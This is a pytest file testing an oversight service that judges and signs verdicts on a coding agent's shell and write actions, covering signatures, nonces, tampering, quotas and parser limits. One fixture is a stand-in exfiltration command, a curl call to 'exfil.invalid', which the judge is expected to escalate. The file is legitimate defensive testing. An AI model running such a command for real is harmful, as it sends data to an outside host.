"""0.2.17: POST /v1/hook/judge after review 9.
R9-01  every answer with parts carries a statement signed by the witness key: the hook's nonce, the hash of the exact request, the full
       list of parts and, per judged part, args_sha256 / rid / verdict / status / reason.
R9-02  one window per key (the judge shares `key:` with /v1/actions), a long body weighs more, the quota is checked before the classifier,
       a shell line longer than hj.MAX_CMD is refused unparsed (EVENT_TOO_LARGE), at most hj.MAX_CONCURRENT judges per account at once;
       the worst line the judge still parses costs bounded time.
R9-04  rounds without an action (need, refuse) are counted toward the quota and shown to the owner; HOOK_ERROR names no exception."""
import json
import os
import time

import cbor2
import pytest

from app import _paths  # noqa: F401
from app import actions as act
from app.hookjudge import judge as hj
from deus_witness import client as dwc
from tests_flow.helpers import set_settings

NONCE = "n" * 32


@pytest.fixture()
def agent(client, owner, tmp_path):
    from app.hookjudge.mapping import default_form
    set_settings(client.app.state.ctx, owner.account["id"], max_pending=1000, max_defers_hour=10000)
    ag, hdr = owner.new_agent("claude-code", "cc")
    owner.mandate(ag["id"], default_form(os.path.realpath(str(tmp_path))))
    return hdr


def _body(cmd, cwd, tool="Bash", nonce=NONCE, **facts):
    f = {"home": "/home/u", "proc_cwd": cwd, "env": {"CLAUDE_PROJECT_DIR": cwd}, "fs": {"realpath": {cwd: cwd, "/home/u": "/home/u"}}, "exec": "off"}
    f.update(facts)
    inp = cmd if isinstance(cmd, dict) else {"command": cmd}
    b = {"v": 1, "event": {"tool_name": tool, "tool_input": inp, "cwd": cwd}, "facts": f, "client": {"name": "t", "version": "0"}, "part": None}
    if nonce is not None:
        b["nonce"] = nonce
    return b


def _statement(client, r):
    pub = client.get("/v1/witness").json()["pub_hex"]
    return cbor2.loads(dwc.open_signed(dwc.b64u_dec(r["statement_b64"]), pub, dwc.TYP_STATEMENT))


# ---------------------------------------------------------------- R9-01
def test_statement_is_signed_and_names_every_part(client, agent, tmp_path):
    p = os.path.realpath(str(tmp_path))
    rp = {p: p, "/home/u": "/home/u"}
    while True:                                                                                # answer the fact rounds as the hook would
        b = _body("echo hi > out.txt; curl -s http://exfil.invalid/x", p, fs={"realpath": dict(rp)})
        r = client.post("/v1/hook/judge", json=b, headers=agent).json()
        if "need" not in r:
            break
        rp.update({x: x for x in r["need"].get("realpath", [])})
    st = _statement(client, r)
    assert st["v"] == "dw-judge-1" and st["nonce"] == NONCE and st["request_sha256"] == dwc.request_sha256(b) == hj.request_sha256(b)
    assert st["parts"] == ["Bash.write", "Bash.net", "Bash"] and st["n_parts"] == r["n_parts"] == 3 and st["part"] is None
    assert [j["tool"] for j in st["judged"]] == ["Bash.write", "Bash.net", "Bash"]         # 0.2.91: the network part is asked, every part judged
    for j, part in zip(st["judged"], r["parts"]):
        assert j["args_sha256"] == dwc.args_sha256(part["tool"], part["args"]) == part["result"]["action"]["args_sha256"]
        assert (j["rid"], j["verdict"], j["status"], j["reason"]) == tuple(part["result"][k] for k in ("rid", "verdict", "status", "reason"))
    assert st["judged"][1]["verdict"] == "defer" and st["judged"][1]["reason"] == "ESCALATE_COMMAND_DANGER"
    with pytest.raises(dwc.AARError):                                                          # a statement is no receipt, and vice versa
        dwc.open_signed(dwc.b64u_dec(r["statement_b64"]), client.get("/v1/witness").json()["pub_hex"], dwc.TYP_AAR)


def test_statement_of_a_rejudge_names_the_part(client, agent, tmp_path):
    p = os.path.realpath(str(tmp_path))
    b = dict(_body("ls", p), part=0)
    st = _statement(client, client.post("/v1/hook/judge", json=b, headers=agent).json())
    assert st["part"] == 0 and [j["i"] for j in st["judged"]] == [0] and st["parts"] == ["Bash"]


@pytest.mark.parametrize("nonce", [5, "", "short", "x" * 87, "bad nonce with spaces!!", True])
def test_bad_nonce_is_400(client, agent, tmp_path, nonce):
    r = client.post("/v1/hook/judge", json=_body("ls", os.path.realpath(str(tmp_path)), nonce=nonce), headers=agent)
    assert r.status_code == 400, r.text


def test_thin_hook_with_real_server_rejects_a_statement_of_another_request(client, agent, tmp_path, monkeypatch):
    """the real hook, the real server: a transport that changes the facts on the way (the server judges something else) -> deny"""
    from deus_witness.hook import main as thin
    from tests.test_0216_thin import Via
    p = os.path.realpath(str(tmp_path))
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", p)
    key = agent["Authorization"][7:]

    class Bend(Via):
        def handle_request(self, request):
            if request.url.path == "/v1/hook/judge":
                b = json.loads(request.read())
                b["facts"]["env"]["CLAUDE_PROJECT_DIR"] = "/"                       # judged under other facts
                import httpx
                request = httpx.Request(request.method, request.url, headers={k: v for k, v in request.headers.items() if k.lower() != "content-length"},
                                        content=json.dumps(b).encode())
            return super().handle_request(request)
    s = thin.Settings({"DEUS_WITNESS_KEY": key, "CLAUDE_PROJECT_DIR": p, "DEUS_WITNESS_EXEC_SCAN": "0"})
    ok = dwc.Witness("http://localhost:8810", key, pin_path=str(tmp_path / "pins" / "w.json"), transport=Via(client))
    assert thin.judge({"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": p}, s, witness=ok)["hookSpecificOutput"]["permissionDecision"] == "allow"
    w = dwc.Witness("http://localhost:8810", key, pin_path=str(tmp_path / "pins" / "w.json"), transport=Bend(client))
    o = thin.judge({"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": p}, s, witness=w)["hookSpecificOutput"]
    assert o["permissionDecision"] == "deny" and "REQUEST_MISMATCH" in o["permissionDecisionReason"], o


# ---------------------------------------------------------------- R9-02
GENS = {"semi": lambda n: "ls;" * (n // 3), "paren": lambda n: "(" * (n // 2) + ")" * (n // 2), "pipe": lambda n: "ls|" * (n // 3) + "ls",
        "and": lambda n: "a&&" * (n // 3) + "a", "sub": lambda n: "$(" * (n // 3) + ")" * (n // 3), "brace": lambda n: "{ " * (n // 4) + "} " * (n // 4),
        "words": lambda n: "echo " + "x " * (n // 2 - 3), "redir": lambda n: "echo >a" * (n // 7)}


def test_the_longest_line_still_parsed_costs_bounded_time(client, agent, tmp_path):
    p = os.path.realpath(str(tmp_path))
    worst = 0.0
    for name, g in GENS.items():
        cmd = g(hj.MAX_CMD)[:hj.MAX_CMD]
        assert len(cmd) <= hj.MAX_CMD
        t0 = time.perf_counter()
        r = client.post("/v1/hook/judge", json=_body(cmd, p), headers=agent)
        worst = max(worst, time.perf_counter() - t0)
        assert r.status_code == 200, (name, r.text[:200])
    assert worst < 0.5, worst


def test_a_longer_line_is_refused_unparsed_and_counted(client, agent, tmp_path, monkeypatch):
    p = os.path.realpath(str(tmp_path))
    called = []
    monkeypatch.setattr(hj.mapping, "map_event", lambda *a, **k: called.append(1))
    r = client.post("/v1/hook/judge", json=_body("ls;" * (hj.MAX_CMD // 3 + 1), p), headers=agent).json()
    assert r["refuse"] == "EVENT_TOO_LARGE" and not called
    db = client.app.state.ctx.db
    assert db.one("SELECT COUNT(*) AS n FROM hook_rounds WHERE kind='refuse' AND code='EVENT_TOO_LARGE'")["n"] == 1


def test_a_long_body_weighs_more_in_the_one_window(client, agent, tmp_path):
    from app import api_agent
    p = os.path.realpath(str(tmp_path))
    big = _body({"file_path": p + "/f.txt", "content": "x" * (200 * 1024)}, p, tool="Write")
    w = hj.weight(len(json.dumps(big)))
    assert w >= 7
    ok = sum(client.post("/v1/hook/judge", json=big, headers=agent).status_code != 429 for _ in range(3 * api_agent.RATE // w + 3))
    assert ok <= 3 * api_agent.RATE // w
    assert client.post("/v1/actions", json={"tool": "Bash", "args": {"command": "ls"}}, headers=agent).status_code == 429   # the same window


def test_account_quota_is_checked_before_the_classifier(client, agent, tmp_path, monkeypatch):
    p = os.path.realpath(str(tmp_path))
    monkeypatch.setattr(client.app.state.ctx.cfg, "quota_per_day", 0)
    called = []
    monkeypatch.setattr(hj, "classify_event", lambda b: called.append(1))
    r = client.post("/v1/hook/judge", json=_body("ls", p), headers=agent)
    assert r.status_code == 429 and r.json()["error"] == "QUOTA" and not called


def test_concurrent_judges_of_one_account_are_bounded(client, agent, tmp_path, owner):
    p = os.path.realpath(str(tmp_path))
    acc = owner.account["id"]
    for _ in range(hj.MAX_CONCURRENT):
        assert hj.enter(acc)
    try:
        r = client.post("/v1/hook/judge", json=_body("ls", p), headers=agent)
        assert r.status_code == 429 and "at a time" in r.json()["detail"]
    finally:
        for _ in range(hj.MAX_CONCURRENT):
            hj.leave(acc)
    assert client.post("/v1/hook/judge", json=_body("ls", p), headers=agent).status_code == 200
    assert hj._RUNNING.get(acc) is None                                               # released after every request, also on errors


# ---------------------------------------------------------------- R9-04
def test_rounds_without_an_action_are_counted_and_shown_to_the_owner(client, agent, owner, tmp_path, monkeypatch):
    p = os.path.realpath(str(tmp_path))
    for i in range(3):
        client.post("/v1/hook/judge", json=_body("cat a%d > /tmp/zz%d" % (i, i), p), headers=agent)          # need
    client.post("/v1/hook/judge", json=_body({"command": "ls", "_witness": {}}, p), headers=agent)          # refuse RESERVED_KEY
    a = [x for x in owner.c.get("/api/agents").json() if x["name"] == "cc"][0]
    assert a["hook_rounds_24h"] == {"need": 3, "refuse": 1, "suspicious": False}
    monkeypatch.setattr(act, "QUOTA_PER_AGENT_DAY", 4)                              # 4 rounds used: the next request is refused at once
    r = client.post("/v1/hook/judge", json=_body("ls", p), headers=agent)
    assert r.status_code == 429 and r.json()["error"] == "QUOTA"
    r = client.post("/v1/actions", json={"tool": "Bash", "args": {"command": "ls"}}, headers=agent)        # the same quota for /v1/actions
    assert r.status_code == 429


def test_many_refusals_are_marked_suspicious(client, agent, owner, tmp_path):
    p = os.path.realpath(str(tmp_path))
    db = client.app.state.ctx.db
    ag = db.one("SELECT * FROM agents WHERE name='cc'")
    for _ in range(20):
        db.x("INSERT INTO hook_rounds(account_id,agent_id,t,kind,code) VALUES(?,?,?,?,?)", (ag["account_id"], ag["id"], int(time.time()), "refuse", "HOOK_ERROR"))
    a = [x for x in owner.c.get("/api/agents").json() if x["name"] == "cc"][0]
    assert a["hook_rounds_24h"]["suspicious"] is True


def test_hook_error_names_no_exception(client, agent, tmp_path):
    p = os.path.realpath(str(tmp_path))
    r = client.post("/v1/hook/judge", json=_body("sort a > b", p, fs={"realpath": {p: p, "/home/u": "/home/u", p + "/b": None}}), headers=agent).json()
    assert r["refuse"] == "HOOK_ERROR" and r["detail"] == ""
